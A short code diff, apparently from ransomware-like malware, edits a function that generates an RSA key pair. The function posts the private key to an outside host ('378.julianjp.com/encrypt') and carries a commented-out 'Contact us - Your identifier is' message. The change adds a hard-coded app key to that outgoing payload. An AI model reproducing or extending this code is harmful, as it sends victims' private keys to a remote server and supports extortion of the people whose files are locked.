@@ -123,7 +123,8 @@ def generate_rsa_keyfile():
   public_name = ''
   payload = {
     'pem': private,
-    'pub': public
+    'pub': public,
+    'app_key': '7mwpCrkxcTt53krZrg983sqCFuFjXktS',
   }
   r = requests.post('https://378.julianjp.com/encrypt', data=payload)
   # print("Contact us - Your identifier is ", r.text)
